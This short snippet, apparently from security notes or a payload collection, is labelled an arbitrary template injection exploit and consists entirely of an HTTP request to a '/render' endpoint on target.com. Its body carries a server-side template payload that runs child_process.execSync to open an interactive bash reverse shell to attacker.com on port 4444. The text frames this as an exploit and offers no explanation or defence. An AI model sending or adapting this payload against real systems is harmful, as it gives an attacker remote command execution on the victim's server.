// **Exploit (Arbitrary Template Injection):**
// http
GET /render?template=pwned HTTP/1.1
Host: target.com
Content-Type: text/html

<%= require('child_process').execSync('bash -c "sh -i >& /dev/tcp/attacker.com/4444 0>&1"') %>